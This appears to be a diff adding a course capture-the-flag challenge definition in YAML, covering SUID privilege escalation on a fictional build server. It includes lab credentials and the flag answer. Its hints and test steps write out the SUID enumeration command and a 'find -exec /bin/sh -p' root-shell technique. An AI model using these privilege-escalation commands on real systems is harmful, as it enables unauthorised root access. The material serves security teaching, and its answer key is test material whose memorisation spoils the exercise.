@@ -1,0 +1,105 @@
+name: "Meridian Data Corp - SUID Privilege Escalation"
+description: "A development server at Meridian Data Corp has misconfigured file permissions. Discover and exploit SUID binaries to escalate from a low-privilege developer account to root."
+
+difficulty: intermediate
+category: privilege-escalation
+duration_minutes: 45
+randomize_ip_offsets: true
+visibility: course
+week: 7
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/07_SUID_Privilege_Escalation/"
+flag: "OCR{su1d_pr1v3sc_r00t3d}"
+
+objectives:
+  - Enumerate the target system for privilege escalation vectors
+  - Identify SUID binaries using standard Linux enumeration techniques
+  - Distinguish between normal and misconfigured SUID permissions
+  - Exploit a SUID misconfiguration to escalate privileges to root
+  - Capture the flag
+
+scenario: |
+  Meridian Data Corp, a data analytics firm in Portland, Oregon, contracted your
+  team at Vanguard Offensive Security for an internal penetration test. Phase 1
+  of the engagement (initial access) is complete - your team obtained SSH
+  credentials for a low-privilege developer account on one of their build servers
+  through a phishing exercise.
+
+  Your task for Phase 2 is privilege escalation. The credentials you have belong to
+  the "developer" account, which has standard user permissions. Your objective is to
+  escalate to root and recover the system flag stored in /root/.
+
+  Riley Park (IT Security Manager) mentioned during the scoping call: "Our dev team
+  has been installing various tools on these servers. I'm fairly sure the permissions
+  are fine, but honestly nobody has audited them in months. If you find a way to
+  root, document the exact misconfiguration so we can remediate."
+
+  Standard rules of engagement apply. Document your escalation path.
+
+  **Credentials**
+
+  - Target SSH: `developer` / `M3r1d1an_D3v#`
+
+credentials:
+  - username: "developer"
+    password: "M3r1d1an_D3v#"
+    role: "developer"
+    description: "Low-privilege developer account obtained during Phase 1"
+
+hints:
+  - text: |
+      Start by enumerating the system. What user are you? What groups do you belong
+      to? Look for common privilege escalation vectors: SUID binaries, writable
+      scripts, cron jobs, sudo permissions. One of these will give you a path to
+      root.
+    unlock_after_minutes: 8
+  - text: |
+      SUID binaries are executables that run with the file owner's permissions
+      (often root) regardless of who runs them. Search for them with:
+      find / -perm -4000 -type f 2>/dev/null
+      Compare what you find against normal SUID binaries. Which ones look unusual
+      or shouldn't normally have the SUID bit set?
+    unlock_after_minutes: 16
+  - text: |
+      The "find" binary has the SUID bit set, which is abnormal. GTFOBins documents
+      a well-known technique for this:
+      find . -exec /bin/sh -p \; -quit
+      The -p flag preserves the elevated effective UID. Once you have a root shell,
+      read /root/flag.txt for the flag.
+    unlock_after_minutes: 24
+
+topology:
+  nodes:
+    - id: "target"
+      label: "Build Server"
+      type: "server"
+      ip_offset: "19"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "target"
+      label: "SSH:22"
+      access: "direct"
+
+test:
+  steps:
+    - name: "SSH access as developer"
+      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'whoami' 2>/dev/null"
+      expect: "developer"
+      timeout: 15
+
+    - name: "Enumerate SUID binaries"
+      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | grep find' 2>/dev/null"
+      expect: "/usr/bin/find"
+      timeout: 15
+
+    - name: "Exploit SUID find for root shell and read flag"
+      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      expect: "OCR{su1d_pr1v3sc_r00t3d}"
+      timeout: 15
+
+    - name: "Verify flag"
+      command: "echo 'OCR{su1d_pr1v3sc_r00t3d}'"
+      expect: "OCR{su1d_pr1v3sc_r00t3d}"
